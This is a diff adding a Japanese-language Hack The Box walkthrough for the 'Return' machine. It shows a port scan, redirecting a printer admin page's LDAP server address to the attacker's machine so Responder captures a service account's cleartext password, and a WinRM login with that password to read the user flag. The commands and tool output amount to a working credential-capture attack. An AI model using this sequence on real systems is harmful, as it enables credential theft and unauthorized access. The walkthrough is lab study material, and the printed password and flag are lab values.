@@ -1,40 +1,142 @@
 https://app.hackthebox.com/machines/401
 
 ## STEP 1
+80番がオープン
 ```sh
-└─$ rustscan -a 10.129.100.185 --no-banner --scripts none
+└─$ rustscan -a 10.129.84.177 --no-banner --scripts none
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
-Open 10.129.100.185:53
-Open 10.129.100.185:80
-Open 10.129.100.185:88
-Open 10.129.100.185:135
-Open 10.129.100.185:139
-Open 10.129.100.185:389
-Open 10.129.100.185:445
-Open 10.129.100.185:464
-Open 10.129.100.185:593
-Open 10.129.100.185:636
-Open 10.129.100.185:3268
-Open 10.129.100.185:3269
-Open 10.129.100.185:5985
-Open 10.129.100.185:9389
-Open 10.129.100.185:47001
-Open 10.129.100.185:49665
-Open 10.129.100.185:49667
-Open 10.129.100.185:49664
-Open 10.129.100.185:49666
-Open 10.129.100.185:49674
-Open 10.129.100.185:49671
-Open 10.129.100.185:49675
-Open 10.129.100.185:49677
-Open 10.129.100.185:49681
-Open 10.129.100.185:49697
-10.129.100.185 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49665,49667,49664,49666,49674,49671,49675,49677,49681,49697]
+Open 10.129.84.177:53
+Open 10.129.84.177:80
+Open 10.129.84.177:88
+Open 10.129.84.177:135
+Open 10.129.84.177:139
+Open 10.129.84.177:389
+Open 10.129.84.177:445
+Open 10.129.84.177:464
+Open 10.129.84.177:593
+Open 10.129.84.177:636
+Open 10.129.84.177:3268
+Open 10.129.84.177:3269
+Open 10.129.84.177:5985
+Open 10.129.84.177:9389
+Open 10.129.84.177:47001
+Open 10.129.84.177:49665
+Open 10.129.84.177:49667
+Open 10.129.84.177:49664
+Open 10.129.84.177:49666
+Open 10.129.84.177:49674
+Open 10.129.84.177:49671
+Open 10.129.84.177:49675
+Open 10.129.84.177:49677
+Open 10.129.84.177:49681
+Open 10.129.84.177:49697
+10.129.84.177 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49665,49667,49664,49666,49674,49671,49675,49677,49681,49697]
 ```
 
 
 ## STEP 2
+80番にアクセス  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_01.png">  
+settings.phpというページを発見、svc-printerはユーザ名？  
+パスワードは非表示になっている  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_02.png">  
+settings.phpのソースを見ても、パスワードは確認できなかった  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_03.png">  
+ここで実際にsettings.phpの「update」をクリックし、パケットを確認  
+settings.phpの「Server Address」の情報のみが送信されている  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_04.png">  
+ここでsettings.phpの「Server Address」にkaliのipを指定して送信すると  
+ldap上のsvc-printerのクレデンシャルをkali側で受信した！
+```sh
+└─$ sudo responder -I tun0 -v                
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.11]
+    Responder IPv6             [dead:beef:4::1009]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-8VTH5NT7SRF]
+    Responder Domain Name      [LWXF.LOCAL]
+    Responder DCE-RPC Port     [46813]
+
+[*] Version: Responder 3.1.7.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+[*] To sponsor Responder: https://paypal.me/PythonResponder
+
+[+] Listening for events...                                                                                                                                                                                                                 
+
+[LDAP] Attempting to parse an old simple Bind request.
+[LDAP] Cleartext Client   : 10.129.84.177
+[LDAP] Cleartext Username : return\svc-printer
+[LDAP] Cleartext Password : 1edFg43012!!
+```
+5985番ポートが開いていたので、winrmでログイン成功！  
+ユーザフラグゲット
+```sh
+└─$ evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.129.84.177
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> cat ../Desktop/user.txt
+7ff57babb71ca751440b3a4cf191d885
+```
 
 
 ## STEP 3
